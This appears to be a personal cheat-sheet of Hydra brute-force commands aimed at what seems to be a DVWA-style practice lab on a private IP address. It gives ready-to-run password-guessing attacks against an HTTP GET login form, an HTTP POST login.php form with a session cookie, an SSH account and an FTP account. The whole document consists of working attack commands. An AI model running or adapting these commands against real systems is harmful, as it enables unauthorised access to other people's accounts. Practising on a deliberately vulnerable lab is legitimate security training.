Brute inside offical brute-force gateway:
hydra -l admin -P passwords.txt 192.168.56.129 -s 8080 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=vj8cn62i9aihhgte2nipeqo6v1; security=low:F=Username and/or password incorrect."

Brute login.php:
hydra -l admin -P passwords.txt 192.168.56.129 -s 8080 http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=vj8cn62i9aihhgte2nipeqo6v1; security=low:F=Login failed"

SSH brute:
hydra -l vongocbao -P passwords.txt 192.168.56.129 ssh -t 16 -vV -f

FTP brute:
hydra -l ftpuser -P passwords.txt -s 21 -t 8 -V ftp://192.168.56.129